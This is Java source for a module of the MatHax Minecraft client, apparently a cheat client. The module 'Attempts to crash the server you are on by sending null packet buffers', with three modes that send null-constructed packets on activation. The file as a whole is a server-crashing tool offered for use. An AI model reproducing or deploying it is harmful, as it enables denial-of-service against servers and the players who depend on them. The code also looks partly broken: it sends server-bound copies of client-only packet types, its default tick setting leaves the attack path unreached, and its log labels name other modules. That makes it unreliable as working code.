package mathax.client.systems.modules.crash;

import it.unimi.dsi.fastutil.ints.IntList;
import mathax.client.eventbus.EventHandler;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.settings.BoolSetting;
import mathax.client.settings.EnumSetting;
import mathax.client.settings.Setting;
import mathax.client.settings.SettingGroup;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import mathax.client.utils.Utils;
import net.minecraft.entity.Entity;
import net.minecraft.item.Items;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket;
import net.minecraft.network.packet.s2c.play.*;
import net.minecraft.util.math.BlockPos;

import static mathax.client.MatHax.LOG;

public class NullExceptionCrash extends Module {
    private final Setting<Modes> crashMode;

    private final Setting<Boolean> autoDisable;

    private final Setting<Boolean> onTick;

    public NullExceptionCrash() {
        super(Categories.Crash, Items.BARRIER, "Null Exception Crash", "CRYSTAL || Attempts to crash the server you are on by sending null packet buffers.");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        crashMode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("mode")
            .description("Which crash mode to use.")
            .defaultValue(Modes.EFFICIENT)
            .build()
        );
        onTick = sgGeneral.add(new BoolSetting.Builder()
            .name("on-tick")
            .description("Sends the packets every tick.")
            .defaultValue(true)
            .build()
        );
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
        );
    }

    @Override
    public boolean onActivate() {
        if(!mc.isInSingleplayer()) {
            if (Utils.canUpdate() && !onTick.get() && mc.world != null) {
                switch (crashMode.get()) {
                    case NEW -> {
                        try {
                            if((mc.player != null) && (mc.getNetworkHandler() != null))
                            {
                                info("NEW method activated.");
                                mc.getNetworkHandler().sendPacket(new GameJoinS2CPacket((PacketByteBuf) null));
                                mc.getNetworkHandler().sendPacket(new BlockUpdateS2CPacket(null, (BlockPos) null));
                                mc.getNetworkHandler().sendPacket(new ClientCommandC2SPacket((Entity) Entity.DUMMY, null));
                                mc.getNetworkHandler().sendPacket(new BoatPaddleStateC2SPacket((PacketByteBuf) null));
                            }

                        } catch(NullPointerException NPE) {
                            LOG.error("NullPointerException for LoginCrash NEW: ", NPE);
                        }

                    }
                    case OLD -> {
                        try {
                            if(mc.player != null && mc.getNetworkHandler() != null)
                            {
                                info("OLD method activated.");
                                mc.getNetworkHandler().sendPacket(new GameJoinS2CPacket(null));
                                mc.getNetworkHandler().sendPacket(new BlockUpdateS2CPacket(null));
                            }

                        } catch(NullPointerException NPE) {
                            LOG.error("NullPointerException for LoginCrash OLD: ", NPE);
                        }

                    }
                    case EFFICIENT -> {
                        try {
                            if(mc.player != null && mc.getNetworkHandler() != null)
                            {
                                info("EFFICIENT method activated.");
                                mc.getNetworkHandler().sendPacket(new GameJoinS2CPacket((PacketByteBuf) null));
                                mc.getNetworkHandler().sendPacket(new BlockUpdateS2CPacket(null, (BlockPos) null));
                                mc.getNetworkHandler().sendPacket(new ClientCommandC2SPacket(null, null));
                                mc.getNetworkHandler().sendPacket(new BoatPaddleStateC2SPacket((PacketByteBuf) null));
                                mc.getNetworkHandler().sendPacket(new ChunkDeltaUpdateS2CPacket((PacketByteBuf) null));
                                mc.getNetworkHandler().sendPacket(new EntityAttachS2CPacket(null, null));
                                mc.getNetworkHandler().sendPacket(new EntitySetHeadYawS2CPacket(null, (byte) mc.player.getHeadYaw()));
                                mc.getNetworkHandler().sendPacket(new EntitiesDestroyS2CPacket((IntList) null));
                                mc.getNetworkHandler().sendPacket(new ClearTitleS2CPacket((PacketByteBuf) null));
                            }
                        } catch(NullPointerException NPE) {
                            LOG.error("NullPointerException for EntityCrash Boat: ", NPE);
                        }

                    }
                    default -> throw new IllegalStateException("Unexpected value: " + crashMode.get());
                }
                toggle();
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }

        return false;
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }


    public enum Modes {
        NEW,
        OLD,
        EFFICIENT
    }
}
